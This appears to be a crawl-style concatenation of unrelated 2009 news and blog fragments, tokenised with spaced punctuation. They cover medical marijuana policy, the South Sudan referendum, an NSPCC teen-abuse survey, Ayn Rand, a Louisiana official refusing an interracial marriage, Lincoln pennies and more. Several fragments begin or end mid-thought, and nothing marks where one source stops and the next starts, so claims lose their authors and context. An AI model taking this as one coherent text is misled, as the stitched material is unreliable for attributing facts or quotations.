Keeping you safe .
Because everyone knows that parents are n't equipped to keep their children safe until a bureaucrat explains exactly how it 's done .
And those parents who are neglecting their children 's safety , well , they always care more once government gets involved .
Right ?

Legalized Marijuana ?
We May Already
Be on the Way George Will says process of pot legalization " probably " already happening .
WASHINGTON , Oct. 25 , 2009  --
With the Obama administration 's decision not to prosecute medicinal marijuana dealers and users , even though they violate federal law , the country is " probably in the process now of legalizing marijuana , " conservative columnist George F. Will said today .
Speaking on ABC's " This Week with George Stephanopoulos , " Will compared what has been happening with marijuana with the gradual changes in laws regarding alcohol , gambling and even prostitution .
" We have legalized gambling in this country over two generations .
It used to be considered a sin and a crime .
With no national debate , and no decision moment , we just did it , " Will said .
" We legalized prostitution as anyone who opens a telephone book and looks under ' escort ' can tell you .
And we may be doing , probably in the process now of legalizing marijuana . "
It is not just the new Obama administration policy on marijuana , but the expanding definitions of medical applications for the drug in the growing number of states that allow pot to be grown , sold and used as a treatment for various conditions .
" Now medical use can be marijuana to cure anxiety , to cure insomnia , all the rest , " Will said .
The new policy -- a striking shift from the hard line taken by the Bush administration -- sparked a wide - ranging discussion today on " This Week . "
" Woody Harrelson is really happy about it , " joked Fox News contributor and radio show host Laura Ingraham , who appeared on " This Week " as a guest commentator .
She called it the " Cheech and Chong initiative " of all the Obama adminstration 's initiatives .
Last week the Obama administration announced it would not seek to federally prosecute individuals who use or dispensaries that provide medicinal marijuana , as long as they complied with state law .
Instead , a Justice Department memo said state prosecutors should pursue " significant traffickers " of illegal drugs , including marijuana .
" We will not use our limited resources in the fight against the marijuana trade against those people who are using it consistent with state law and to fight serious illnesses , such as cancer or other diseases , " Attorney General Eric Holder said last week .
The new policy is a significant departure from the Bush administration 's , which called for enforcing federal anti-marijuana laws , regardless of state laws .
Using and providing medicinal marijuana is legal in 14 states : Alaska , California , Colorado , Hawaii , Maine , Maryland , Michigan , Montana , Nevada , New Mexico , Oregon , Rhode Island , Vermont and Washington .
Marijuana Is a ' Mixed Bag ' for Many
But John Podesta , who was White House chief of staff for President Clinton and is the president and CEO of the progressive think tank Center for American Progress , said the attorney general is looking at a broader picture .
" I think that what Eric Holder did was to say look , we have scarce resources .
We 're not going to go after people with glaucoma or cancer or whatever on medical marijuana .
They 're still going with a vengeance really against the Mexican drug cartels .
So I think there 's -- this is kind of a mixed bag , " said Podesta , who also served on President Obama 's transition team .
" The United States has the highest prison population of any country in the world , and I think that largely has been the result of mandatory prison sentences as a result of junk laws , and I think that these changes that we 're seeing now probably will ripple back , " he continued .
" And I think that 's a place that people really have to consider whether they want to incarcerate this large number of people and the cost of that in our society . "
Al Hunt , Washington , D.C. , bureau chief for Bloomberg News , agreed that resources could be better spent elsewhere .
" Well , now that I no longer have a teenager , I have a little bit different view , a bit more permissive , " he said .
" I do n't think it 's a great utilization of scarce federal resources to be prosecuting pot .
" I am not sure if it 's going to lead to what George suggests [ eventual legalization ] .
I 'm not sure that would be a bad idea , " he said .
" But I was at the University of Mississippi a couple of years ago and it's interesting , they grow marijuana on the campus .
So , times are a - changing . "
Taxing Pot to Pay for Health Care ?
However , there was one circumstance under which Podesta thought " full legalization " could occur .
" I think we wo n't see a full legalization of marijuana until somebody figures out that if you tax it , maybe you can pay for health care , " he said .
Will also said taxing marijuana could be a way to go after Mexican drug cartels .
" Eighty percent of the revenue of the Mexican cartels is marijuana .
If you really want to go after the Mexican cartels , and I 'm not saying that is the only criterion for public policy , you 'd legalize marijuana , " he said .
Public Sympathy on the Side of Medicinal Marijuana
Legalizing marijuana remains controversial , but the public is less divided on medicinal marijuana .
A March 2001 Pew Research
Center poll showed that nearly 75 percent of those polled were in favor of allowing doctors to prescribe marijuana for medical purposes to treat their patients .
" I think all of us have either gone through cancer or family members , and it's a terribly painful disease .
I think you have a lot of sympathy .
There 's a lot of public sympathy for medical marijuana use , " Ingraham said .
Cynthia Tucker , political columnist for the Atlanta Journal - Constitution newspaper , called for a broader view of the administration 's policy change .
" I really think instead of just acting in a small way to say , marijuana is n't such a bad thing , let 's relook at all of our drug laws , the way we fight the so - called war on drugs , because it is n't working , " she said .
Epigraph
Oh the torment bred in the race ,
the grinding scream of death ,
and the stroke that hits the vein ,
the hemorrhage none can staunch , the grief ,
the curse no man can bear .
But there is a cure in the house ,
and not outside it , no ,
not from others but from them ,
their bloody strife .
We sing to you ,
dark gods beneath the earth .
Now hear , you blissful powers underground —
answer the call , send help .
Bless the children , give them triumph now .
– Aeschylus , The Libation Bearers Death is but crossing the world , as friends do the seas ; they live in one another still .
For they must needs be present , that love and live in what is omnipresent .
In this divine glass , they see face to face ; and their converse is free , as well as pure .
This is the comfort of friends , that though they may be said to die , yet their friendship and society are , in the best sense , ever present because immortal .
– William Penn , More Fruits of Solitude
We may think we know the telltale signs of lying , be it shifty eyes or nervous fidgeting .
Professional interrogators look for such tells , too , assuming a suspect ’s nervousness betrays his guilt .
But interrogation can rattle even the innocent , so nervousness alone cannot distinguish liars from truth - tellers .
Scientists looking for better ways to detect lies have found a promising one : increasing suspects ’ “ cognitive load . ”
For a host of reasons , their theory goes , lying is more mentally taxing than telling the truth .
Performing an extra task while lying or telling the truth should therefore affect the liars more .
To test this idea , deception researchers led by psychologist Aldert Vrij of the University of Portsmouth in England asked one group to lie convincingly and another group to tell the truth about a staged theft scenario that only the truth - tellers had experienced .
A second pair of groups had to do the same but with a crucial twist : both the liars and the truth - tellers had to maintain eye contact while telling their stories .
Later , as researchers watched videotapes of the suspects ’ accounts , they tallied verbal signs of cognitive load ( such as fewer spatial details in the suspects ’ stories ) and nonverbal ones ( such as fewer eyeblinks ) .
The eyeblinks are particularly interesting because whereas rapid blinking suggests nervousness , fewer blinks are a sign of cognitive load , Vrij explains — and contrary to what police are taught , liars tend to blink less .
Although the effect was subtle , the instruction to maintain eye contact did magnify the differences between the truth - tellers and the liars .
So do these differences actually make it easier for others to distinguish liars from truth - tellers ?
They do — but although students watching the videos had an easier time spotting a liar in the eye - contact condition , their accuracy rates were still poor .
Any group differences between liars and truth - tellers were dwarfed by differences between individual participants .
( For example , some people blink far less than others whether or not they are lying — and some are simply better able to carry a higher cognitive load . )
All this makes it hard to put the study ’s findings into practice — especially out in the field , where the people most likely to lie are those who are good at lying .
“ In the real world , there ’s no Pinocchio - like cue that distinguishes liars from truth - tellers , ” says study co-author Ronald Fisher of Florida International University .
Magnifying subtle differences may be the next best thing .

More than 2,000 people have died in ethnic clashes in Sudan this year South Sudan says it has achieved a breakthrough in talks with the north over terms for a referendum on full independence for the south .
South Sudan 's Vice - President Riek Machar said the vote in 2011 will require a simple majority as long as two - thirds of voters takes part .
In the past , central government in the north has insisted that 75 % of voters must agree to independence .
The issue was one of a number that have caused tension between north and south .
Diplomats have been warning of a possible resumption of the 22 - year civil war .
Celebrating Mr Machar announced the deal in the South Sudan capital Juba following talks in Khartoum with national Vice - President Ali Osman Taha .
" We have overcome the differences over the outstanding issues , and there is an agreement , " Mr Machar said .
He said he welcomed the agreement , although the south had pushed for a lower turnout requirement .
" I would have wished the turnout quorum to be a little bit lower , not that the south cannot meet the two - thirds registered voters ... but because of the difficulties we have such as security , transport , logistics , movement of people , " he said .
Mr Machar said that all southerners will be allowed to vote , including those in the northern capital Khartoum and those outside Sudan .
The BBC's Peter Martell in Juba says that although the agreement still needs to be ratified by officials in the north and south , it marks a breakthrough .
There was no immediate comment from the President Omar al - Bashir 's National Congress Party .
However , our correspondent says many in the south are already celebrating what they see as an important step towards the referendum .
The vote , due in January 2011 , is part of a 2005 peace deal that ended the civil war .
The conflict pitted the Muslim north against Christians and animists in the south , leaving some 1.5 m people dead .
At least 2,000 people have been killed in bitter ethnic clashes in South Sudan , notably Jonglei state , this year .
Mr Machar 's SPLM party has accused the northerners of trying to stir up unrest ahead of the referendum and national elections due in 2010 .

Or so the former Senate Republican Leader , a surgeon who has written a new book on health care , told me a few minutes ago in an interview .
Were he still in the Senate , “ I would end up voting for it , ” he said .
“ As leader , I would take heat for it . …
That ’s what leadership is all about . ”
This is not to say that Frist is entirely happy with everything that is in the bill .
For one thing , he does n’t think it does nearly enough to bring costs under control .
In his view , it does not fundamentally change the incentives that providers now have to provide more care , rather than better care .
“ There is really nothing to bend the cost curve , ” he says .
And Frist also predicts it will extend coverage to only 20 million or so additional Americans –far short of true universal coverage .
Given the fiscal constraints , he says a better approach would be to provide a more bare - bones package of benefits , known as “ catastrophic coverage . ”
That less expensive insurance , while not covering as many routine medical services , would be affordable to more people and provide for care should they suffer a serious illness or condition that might otherwise bankrupt them .
However , he strongly supports other aspects of the bill–most notably , its requirement that individuals be required to purchase coverage , if they do not receive health insurance through their employers or under government programs .
And he also lauds the provisions that would eliminate practices that allow insurance companies to discriminate against people based on their health history , including pre-existing conditions .
Frist also faults some in his own party for injecting alarmism into the debate .
“ Clearly , the death panels and public plan arguments have been overblown , ” he says .
Frist noted that Republicans themselves voted for a Medicare prescription drug bill that would have established a version of a public plan–with the government negotiating directly with drug companies –if private - sector competition had failed to materialize .
That is similar to the approach that Republican Senator Olympia Snowe is taking with her amendment to establish a public option with a “ trigger . ”
While Frist believes that the bill will pass , he worries that the Obama Administration and Congress have not given enough attention to what happens next : the implementation .
The first few years are likely to be rough , he predicts .
States will be struggling to set up new marketplaces for insurance coverage , their medicaid rolls will grow , taxes will go up , and consumers will not yet see the benefits .
“ The Republicans will go wild , ” using the start - up difficulties as a tool for fundraising and for making their case in the next election , Frist says .
“ In the Congress , nobody ’s thinking about that . ”
His advice for the Obama Administration : “ Stay nimble , ” and be prepared to make adjustments as difficulties arise .
UPDATE : Our friend Jon Cohn has an interesting observation :
Only two days after signing the Matthew Shepard hate crimes bill into law , President Obama today signed an extension to the Ryan White Act which provides assistance and support to nearly half a million people suffering from HIV / AIDS .
“ If we want to be a global leader in combatting HIV / AIDS , we need to act like it , ” Obama said at the White House before signing a bill to extend the Ryan White HIV / AIDS program .
Begun in 1990 , the program provides medical care , medication and support services to about half a million people , most of them low - income .
The bill is named for an Indiana teenager who contracted AIDS through a blood transfusion at age 13 .
White went on to fight AIDS - related discrimination against him and others like him and help educate the country about the disease .
He died in April 1990 at the age of 18 .
His mother , Jeanne White - Ginder , attended the signing ceremony , as did several members of Congress and HIV / AIDS activists .
Obama also said he will be finalizing an order on Monday that will lift the HIV immigration and travel ban that has been in place for 20 years .
Video of the ceremony below …
My friends … it was a very good week .
First hate crimes and now this .
It gives one hope for the future .
Let ’s hope the vote in Maine does n’t erase all that .

The NSPCC says many teenage girls are in abusive relationships A third of teenage girls suffer sexual abuse in a relationship and a quarter experience violence at the hands of their boyfriends , a survey suggests .
Nearly 90 % of 1,400 girls aged 13 to 17 had been in intimate relationships , the NSPCC and University of Bristol found .
Of these , one in six said they had been pressured into sexual intercourse and one in 16 said they had been raped .
The government is developing guidance for schools on gender bullying but says it is " vital " parents advise children .
One in three of the teenage girls questioned in England , Scotland and Wales said their boyfriends had tried to pressure them into unwanted sexual activity by using physical force or by bullying them .
The NSPCC said the unwanted sexual activity ranged from kissing to intercourse .
A quarter of the girls interviewed for the survey had suffered physical violence , including being slapped , punched or beaten .
Only one in 17 boys reported having been pressured or forced into sexual activity but almost one in five had suffered physical violence in a relationship .
'I COULDN'T GET AWAY FROM HIM ' Samantha , not her real name , was just 14 when her boyfriend of 15 tried to control her life .
Things were fine to start with but then he became very possessive and would n't leave me alone .
I would get bombarded with phone calls and texts from him demanding to know where I was , what I was doing and who I was with .
It just became too much .
I could n't get away from him .
After five months I ended the relationship and he just could n't accept it .
He started hanging around near our house and following me wherever I went .
Then he got really nasty and began telling people we had had sex , which was n't true .
Finally there was a confrontation one day at school and he hit me in the face .
It started a big fight because some of my friends were with me but fortunately staff broke it up .
Then I did n't see him for a while and eventually things quietened down .
Some of my friends have experienced the same sort of thing but not all boys are like that .
Read more of your stories here Professor David Berridge , from the University of Bristol , described the findings as " appalling " .
" It was shocking to find that exploitation and violence in relationships starts so young , " he said .
" This is a serious issue that must be given higher priority by policymakers and professionals . "
Diane Sutton , head of NSPCC policy and public affairs , said : " Boys and girls are under immense peer pressure to behave in certain ways and this can lead to disrespectful and violent relationships , with girls often bearing the brunt . "
' Confused ' Jo Sharpen works for the Greater London Domestic Violence Project .
She trains police , teachers and other people who work with teenagers to look out for signs of adolescent domestic abuse .
She said : " As a society we do n't educate young people about what a healthy relationship is .
" Young people are confused about this and it is n't the first survey to show very worrying attitudes about violence being appropriate or people expecting sex .
" Teenagers are just as likely to be victims as adults . "
' Schools have a role ' A spokesman for the Department for Children , Schools and Families said personal , social , health and economic studies - including relationship education - would become statutory for children of all ages in England by September 2011 .
" Parents have a vital role to play in providing information and advice on sex and relationships , " he said .
" They should lead on instilling values in their children , but schools have a clear role in giving young people accurate information and developing the skills they need to make safe and responsible choices . "

Last month , the US Senate passed the Travel Promotion Act .
Such law will directly benefit the US tourism and travel sector .
But those owners who are looking to get out of their timeshares may also indirectly benefit from the Act .
The Travel Promotion
Act will create a public - private partnership for the purpose of promoting the US as a premier travel destination .
Once it is put in place , the program is estimated to create thousands of jobs , increase consumer spending , and reduce the federal budget deficit .
In addition to that , this will also drive millions of new visitors to the US .
This implies that with more tourists and longer vacations in the US , there are also more timeshare buyers and timeshare renters .
According to Bill Marriott , chairman and CEO of Marriott International , “ in 2008 the US welcomed fewer overseas visitors than in 2000 despite the fact that 48 million more people were taking overseas trips to countries around the world .
This means that the pie grew big , but the US got a smaller piece of it .
By marketing ‘ Brand America , ’ it ’s time that the US claims a bigger piece of the pie . ”
This law also gave hope to those timeshare owners who are already desperate in getting rid of their timeshares as most of them have already tried any way possible just to get rid of that considered unwanted property .
But with this development , they may be able to rent out or sell their properties without hiring a timeshare transfer company like the Transfer Smart .
With this newly passed act , there will be more potential buyers and renters of timeshares .
The Fast and the furious : Stylist at London Fashion
Week resigns over designer Mark Fast 's decision to use size 14 models
Preparing for his London Fashion
Week slot , knitwear designer Mark Fast decided to challenge the obsession with size zero models and use curvier women to showcase his creations .
It was a bold move - and one which nearly led to his entire project unravelling .
When he told his design team that his figure - hugging outfits would be paraded down the runway by size 12 and 14 models , two of his people were apparently so angry they quit .
Big issue : A size 12 model leads the final walk - out at the Mark Fast catwalk show at London Fashion Week .
The designer used size 12 and 14 girls alongside more conventional - sized models to showcase his knitted dresses
The stylist and creative designer deserted Fast , 28 , just three days before Saturday 's event at the University of Westminster .
The show was only saved after freelancers Daniela Agnelli and Natalie Hubbarb stepped in to help Fast , working into the early hours to ensure all the designs were ready for the big day .
Happily , it was a great success , with three models from the agency 12 + UK gracing the catwalk .
Fuller - figured : Curvier women were used to model Mr Fast 's ' bodycon ' dresses .
In 2007 , a Model Health Inquiry was launched in response to the death of several ' size zero ' models .
It failed to set out any firm industry guidelines
Amanda May , Fast 's creative director , yesterday blamed the walkout on ' creative differences ' over the use of larger models .
' There was a team change and we are glad we stuck to our vision , ' she said .
' The decision to use fuller girls is something we have been talking about .
There 's an idea that only thin and slender women are able to wear Mark 's dresses and he wanted to combat that .
We wanted
women to know they did n't have to be a size zero to wear a Mark Fast dress - curvier women can look even better in them . '

The models used in the show were Hayley Morley , 21 , a size 12 , Laura Catterall , 20 , a size 14 and Gwyneth Harrison , 25 , a size 12 - 14 .
Sarah Watkinson , 37 , founded 12 + UK in 2000 and has 37 models on her books .
She said : ' I 'm very happy that Amanda and Mark stuck to their passion .
They really wanted to do it but it was difficult for them .
' Mark has been passionate about using larger women and really wanted to show that they look great in his dresses .
' Every time I think things are progressing , they end up going back to how they 've always been .
I hope this has sparked lasting changes . '
Fast , a Canadian , has also been involved in the photographic exhibition All Walks Beyond The Catwalk , which features models aged 18 to 65 and sized eight to 16 wearing clothes created by young London designers .
The exhibition , which opened on Friday at Somerset House , attempts to challenge the narrow view of beauty in the fashion world .
The day before Fast 's show , chairman of the Institute of Psychiatry 's eating disorder team , Professor Ulrike Schmidt , had raised concerns over the use of stick - thin models .
He said : ' We are very concerned that the lack of medical checks of models at London Fashion Week , coupled by an environment where being underweight is the norm , prevents those with eating disorders into gaining an insight into their condition . '
As Speaker of the House Nancy Pelosi was unveiling the Affordable Health Care for America Act Thursday morning on the steps of the Capitol , someone started apparently heckling her through a loudspeaker .
With Democratic members of the House of Representatives standing in rows behind her , Pelosi had just stated , “ Today , we are about to deliver on the promise of making affordable , quality health care available for all Americans , laying the foundation for a brighter future for generatrions to come . ”

At that point , muffled sounds coming from a distance interrupted her words .
Although the identity of the heckler or even what they were saying was n’t clear , Pelosi had no hesitation in responding .
“ Thank you , insurance companies of America ! ! ” she announced loudly , as the members of Congress behind her laughed appreciatively .

In fact , any editor certainly would cut the Bible , if an agent submitted it as a new work of fiction .
But Cerf offered Rand an alternative : if she gave up 7 cents per copy in royalties , she could have the extra paper needed to print Galt ’s oration .
That she agreed is a sign of the great contradiction that haunts her writing and especially her life .
Politically , Rand was committed to the idea that capitalism is the best form of social organization invented or conceivable .
This was , perhaps , an understandable reaction against her childhood experience of Communism .
Born in 1905 as Alissa Rosenbaum to a Jewish family in St. Petersburg , she was 12 when the Bolsheviks seized power , and she endured the ensuing years of civil war , hunger and oppression .
By 1926 , when she came to live with relatives in the United States and changed her name , she had become a relentless enemy of every variety of what she denounced as “ collectivism , ” from Soviet Communism to the New Deal .
Even Republicans were n’t immune : after Wendell Willkie ’s defeat in 1940 , Rand helped to found an organization called Associated Ex-Willkie Workers Against Willkie , berating the candidate as “ the guiltiest man of any for destroying America , more guilty than Roosevelt . ”
Yet while Rand took to wearing a dollar - sign pin to advertise her love of capitalism , Heller makes clear that the author had no real affection for dollars themselves .
Giving up her royalties to preserve her vision is something that no genuine capitalist , and few popular novelists , would have done .
It is the act of an intellectual , of someone who believes that ideas matter more than lucre .
In fact , as Heller shows , Rand had no more reverence for the actual businessmen she met than most intellectuals do .
The problem was that , according to her own theories , the executives were supposed to be as creative and admirable as any artist or thinker .
They were part of the fraternity of the gifted , whose strike , in “ Atlas Shrugged , ” brings the world to its knees .

Rand ’s inclusion of businessmen in the ranks of the Übermenschen helps to explain her appeal to free - marketeers — including Alan Greenspan — but it is not convincing .
At bottom , her individualism owed much more to Nietzsche than to Adam Smith ( though Rand , typically , denied any influence , saying only that Nie­tzsche “ beat me to all my ideas ” ) .
But “ Thus Spoke Zarathustra ” never sold a quarter of a million copies a year .
Rand ’s potent message could lead to intoxication and even to madness , as the second half of her life showed .
In 1949 , Rand was living with her husband , a mild - mannered former actor named Frank O’Connor , in Southern California , in a Richard Neutra house .
Then she got a fan letter from a 19 - year - old college freshman named Nathan Blumenthal and invited him to visit .
Rand , whose books are full of masterful , sexually dominating heroes , quickly fell in love with this confused boy , whom she decided was the “ intellectual heir ” she had been waiting for .
The decades of psychodrama that followed read , in Heller ’s excellent account , like “ Phèdre ” rewritten by Edward Albee .
When Blumenthal , who changed his name to Nathaniel Branden , moved to New York , Rand followed him ; she inserted herself into her protégé ’s love life , urging him to marry his girlfriend ; then Rand began to sleep with Branden , insisting that both their spouses be kept fully apprised of what was going on .
Heller shows how the Brandens formed the nucleus of a growing group of young Rand followers , a herd of individualists who nicknamed themselves “ the Collective ” — ironically , but not ironically enough , for they began to display the frightening group - think of a true cult .
One journalist Heller refers to wondered how Rand “ charmed so many young people into quoting John Galt as religiously as ‘ clergymen quote Matthew , Mark , Luke and John . ’ ”
Inevitably , it all ended in tears , when Branden fell in love with a young actress and was expelled from Rand ’s circle forever .
That he went on to write several best - ­selling books of popular psychology “ and earned the appellation ‘ father of the self - esteem movement ’ ” is the kind of finishing touch that makes truth stranger than fiction .
For if there is one thing Rand ’s life shows , it is the power , and peril , of unjustified self - esteem .
Recently I 've been doing some presentations as well as just general sketches of some things I 've been thinking about regarding optimization , concurrency and data design .
I 've been posting them on Twitter to gather feedback from my pals there .

And do n't forget it 's all in good fun !

Dave Prowse who plays super villain Darth Vader was stranded on the M1 The force came to the rescue of one of the Universe 's most notorious villains when his vehicle broke down on the M1 in Northamptonshire .
Dave Prowse , who plays Darth Vader in the Star Wars films , was saved by the Highways Agency motorway rescue force .
He was standing behind a barrier , intimidated by the speed of passing traffic when help arrived .
The force helped him get to a Star Wars group 's reunion at the National Space Centre in Leicester .
The East Midlands Regional Control Centre at Watford Gap sent the patrol to help the star , who also educated a generation of children as TV's Green Cross Code Man in the 1970s and 1980s .
R2D2 used to keep a little ladder inside the boot so he could climb up and put his suitcases inside
Dave Prowse " The traffic officers told me to wait behind the barrier , and I could n't believe the noise from the traffic that was sailing past me , " said Mr Prowse .
" I am known as the Green Cross Code Man , but this was a totally different situation .
He added : " I was on my way to rehearsals and filming at Yoxall , near Burton on Trent when I broke down last Thursday . "
" Then , at the weekend I was due to attend a reunion of the 501st UK Garrison , which is a Star Wars costumed charitable organisation , at the National Space Centre in Leicester and needed the car .
" I 'm the Commander in Chief Worldwide so it was really important I that I was there , and when I broke down my boot was full of memorabilia and photos . "
' Leave the cord ' Officers Craig Chapman and Asha -Jayne Neary based at Watford Gap , and control room traffic officer Jo Li who was gaining experience of patrol work , were sent .
While assisting Dave , who lives in Croydon , the traffic officers realised who he was and also the unusual history of his Mercedes car .
" The car was previously owned by my good friend Kenny Baker who was R2D2 , " said Dave .
" He used to keep a little ladder inside the boot so he could climb up and put his suitcases inside .
" When he had finished , he 'd put the ladder back and used a cord to shut the boot .
" I decided to leave the cord there as a reminder of the car 's previous owner . "
Mr Chapman , 29 , of Milton Keynes , said : " Meeting Darth Vader is definitely one of the strangest situations I 've been in . "

Many refugees attempt to reach Australia by sea Australia 's prime minister has made a personal plea to the Indonesian president to prevent a boatload of Sri Lankan migrants reaching Australia .
Kevin Rudd made the phone call over the weekend asking the Indonesian authorities to intervene .
The boat , which set off from Indonesia , had 260 suspected Sri Lankan asylum seekers , some women and children .
The vessel was intercepted by the Indonesian navy off Krakatoa and was reportedly escorted to West Java .
Mr Rudd said he had discussed " our continued co-operation on people - smuggling " during the phone call to President Susilo Bambang Yudhoyono on Saturday .
" I make no apology whatsoever for working as closely as I need with our Indonesian friends and partners to get the result we all need in terms of illegal immigration , " he said , according to the Associated Press .
Surge People smugglers often bring refugees to Australia by boat via Indonesia .
If the boat had reached Australian waters it would have been the largest number of asylum seekers since Mr Rudd 's centre - left government came to office in 2007 .
Many of those seeking asylum are taken to an immigration detention centre on Christmas Island , about 2,575 km ( 1,600 miles ) north - west of the mainland , from where their applications are processed .
According to the Australian press , the centre is nearing its full capacity of 1,200 people .
The government has blamed the recent rise in asylum seekers on the ongoing conflicts in Afghanistan and Sri Lanka , along with the global economic downturn .
Australia 's opposition has linked the upsurge with a relaxation of the country 's immigration policy since Kevin Rudd became prime minister in late 2007 .
The Rudd government scrapped the widely - criticised policy of his predecessor , John Howard , under which asylum - seekers and their children were detained for years in special centres in Nauru or Papua New Guinea , a plan labelled the " Pacific Solution " .
Asylum seekers now arriving by boat are held on Christmas Island , but their claims must be expedited , with six - monthly case reviews by an ombudsman now government policy .

A justice of the peace in Louisiana is facing disciplinary action after he refused to marry a mixed - race couple on the grounds that it would not be fair to any children they might have .
Keith Bardwell , a JP for 34 years in Tangipahoa parish , south - eastern Louisiana , turned away Beth Humphrey , 30 , who is white , and Terence McKay , 32 , who is black .
They were the fourth interracial couple to whom he had declined to issue a marriage licence .
Bardwell , who is white , insists he is not a racist and that his decision last week was governed by his concern that mixed - race children were shunned by both white and black communities .
He told the Hammond Star : " I do n't do interracial marriages because I do n't want to put children in a situation they did n't bring on themselves .
I feel the children will later suffer . "
He told the Associated Press : " I 'm not a racist .
I just do n't believe in mixing the races that way .
I have piles and piles of black friends .
They come to my home , I marry them , they use my bathroom .
I treat them like everyone else . "
Bardwell 's actions are particularly sensitive in Louisiana , one of 17 mainly southern states that only repealed laws banning mixed - race marriages and relationships when forced to do so by the US supreme court in the 1967 case of Loving vs Virginia .
Until then " miscegenation " , as it was legally called , was outlawed in many states and was one of the most invasive elements of southern segregation .
In 1883 , the supreme court ruled that states were within their rights to ban mixed marriages , finding that this did not breach the constitutional requirement to treat everybody impartially , arguing that white people and black people were punished in equal measure for breaking the miscegenation laws .
That ruling stood until the 1967 Loving case .
Humphrey , who left the US military last year , said she was appalled by the JP 's actions .
" That 's blatant discrimination . "
The local branch of the American Civil Liberties Union has written to state judicial authorities asking for an investigation and for Bardwell to receive the " most severe sanctions available " .
Humphrey and McKay say they will consult the US justice department about filing a discrimination complaint .
I ’m not surprised that Shepard Smith is the one who finally did this .
Actually , I ’ve been expecting it for a while :
It ’s an inescapable fact that reforming health care insurance means making it available to everyone — otherwise , you cannot control costs at all .
It ’s also an inescapable fact that without a public option , we are going to spend a lot more than we have to .
Health care reform without a public option is a big , fat insurance industry bailout .
Today , the usual Google logo has been replaced by the ubiquitous black - and - white bar code design to celebrate the 57th anniversary of the first bar code patent .
On October 7 , 1952 , inventors Norman Woodland and Bernard Silver were granted the first patent for their invention .
The only difference between the bar code we know today and the one Woodland and Silver invented was that it was comprised of a series of concentric circles , not the 59 black - and - white vertical lines synonymous with the current design .
Earlier this year , on June 26 , the bar code celebrated its 35th birthday .
In 1974 , a scanner in a Marsh supermarket in Troy , Ohio , met the simple black - and - white striped bar code design tacked onto a 10 - piece pack of Juicy fruit gum .
Now , more than 10 billion bar codes are scanned in 25 industries and in places including airports , hospitals , and shipping centers , according to Motorola .
TechCrunch reports that the Google logo bar code spells out " Google " using Code 128 , which they describe as " a standard way of encoding ASCII character strings ( ie. A - Z , a - z , 0 - 9 , etc. ) into a bar code . "
Last week , on October 2 , Google replaced its " G " with a drawing of activist Mahatma Gandhi , to commemorate what would 've been his 140th birthday .
In September , Google paid homage to HG Wells , author of War of the Worlds , by adding crop circles and UFOs to its logo .

She said : '' It is our responsibility to engage with all sectors of society about the issue of litter , and this means that we have to be as innovative and creative as possible to target even the most illusive of groups , who do not respond to mainstream campaigns , but are key to creating a generation who do not throw litter .

The Tax Justice Network this week launched the world ’s biggest website for the study of “ secrecy jurisdictions ” – those shady little corners , more commonly known as “ tax havens ” , where the rich and well connected hide their ill - gotten gains , or clean dirty money on its way to legitimate western bank accounts .
Secrecyjurisdictions.com is a massive , on - going research project .
It collects key data on the world ’s 60 secrecy jurisdictions and aims to “ map the faultlines ” of the global financial infrastructure ( including the “ pinstripe army ” of lawyers , bankers and accountants ) .
These are the people that enable tax evasion , terrorist financing , organised crime , the looting of developing world assets and a whole host of other evils to take place .
As the website overview states :
Secrecy jurisdictions facilitate illicit financial flows stemming from three overlapping sources : bribery , criminal activity and cross - border trade mispricing .
Secrecy jurisdictions and those operating through them undermine development for the poorest countries , and create a criminogenic environment in which all sorts of crimes can thrive and feast on the fruits of law - breaking .
Secrecy jurisdictions facilitate a wide range of crimes such as tax evasion , non-payment of alimonies , money laundering , terrorist financing , drug trafficking , human trafficking , illegal arms trading , counterfeiting , insider - dealing , embezzlement , fleeing of bankruptcy orders , all sorts of fraud , and many more .
…
Financial opacity undermines the rule of law and destroys trust in markets .
Loss of trust seriously damages market efficiency , raising the cost of capital and wrecking confidence in democracy .
Its purpose is to serve as a resource for those seeking to bring about positive change in the international financial system .
That change is desperately needed .
Global Financial Integrity has estimated that each year , developing and transnational economies experience $ 800 billion – $ 1.06 trillion of outflows due to illicit financial flows .
Each year , the developed world gives these economies just $ 100 billion in aid .
By facilitating illicit financial flows , secrecy jurisdictions are at the heart of global poverty , as well as a wider web of corruption , crime and financial abuse .

That U.S. coin that 's worth so much hardly anyone bothers to pick up dropped ones has another new design coming out this week , the third of four versions released this year .
And collectors -- or other folks lacking cents -- can purchase two rolls of the new Lincoln pennies from the U.S.
Mint for only nine times their $ 1 face value ( plus , of course , shipping and handling ) .
In modern - day Washington , such inflationary numbers pass for a heckuva deal .
Arguably the greatest president of all 44 , Abraham Lincoln , No. 16 , has been on the one - cent coin for 100 years and 12 days , ever since Teddy Roosevelt ordered up the first to replace the Indian head penny and mark the 100th anniversary of Lincoln 's birth .
It 's the longest - circulating American coin of any being made and the first to carry the once noncontroversial words : " In God We Trust . "
The Mint makes about 1,000 pennies per minute .
For the average 25 to 30 years of use , each penny spends years collecting dust on dressers , entombed in the darkness of piggy banks or residing in cups on store counters for anyone who thinks they 're worth taking .
This year 's Lincoln pennies look different .
See photo above , actual size .
( Just kidding ) Each 2009 version , of course , includes the familiar right - facing bust of Lincoln .
The backs depict varying aspects of life for the country lawyer , one - time House member and unsuccessful Senate candidate who went on to be come the country 's first Republican president and the first assassinated .
One new penny shows the late president as a beardless , gangly young man sitting on a log reading a book , which he no doubt walked several miles to return by its due date .
This month 's new penny portrays Lincoln standing in front of the old Illinois state capitol in Springfield to commemorate where Barack Obama would one later day announce his own successful presidential candidacy from a different party .
A third version depicts a simple log cabin , which was in 19th century American politics a standard political symbol of personal origin showing a candidate to be a regular man of the people much like , say , a Harvard Law School degree has become today .
The fourth Lincoln penny , due out in November , will show a topless U.S. Capitol building , not because it was blown off during nearby Civil War fighting but because it was being built during Lincoln 's presidential terms .
In fact , despite the war Lincoln insisted on continuing construction as a symbol of imperative national union .
As a symbol of contemporary federal fiscal thinking in Washington , each of the nearly 5.5 billion one - cent pieces stamped annually actually costs 1.4 cents to manufacture .

christwire.org have outed my real identity .
According to them , I am “ a Jewish Philadelphia - based reporter for Fox rival ABC ” , real name James Goldman .
I was arrested “ On June 18 , 2006 , [ … ] by the New York City Police Department in Manhattan for soliciting a transvestite prostitute . ”
I also appear to be in my early 60s with grey hair .
Which is fascinating !
OK , so — I get it .
Super funny .
The “ joke ” being that someone somewhere at christwire either does n’t realise the Glenn Beck rape and murder parody is a satirical commentary on the methods
Beck uses to stir racial hatred and political extremism OR it is the single funniest be - like - them - to - laugh - at - them site I ’ve ever seen .
I have to say my alternate future self does look quite dashing with his silver tash .
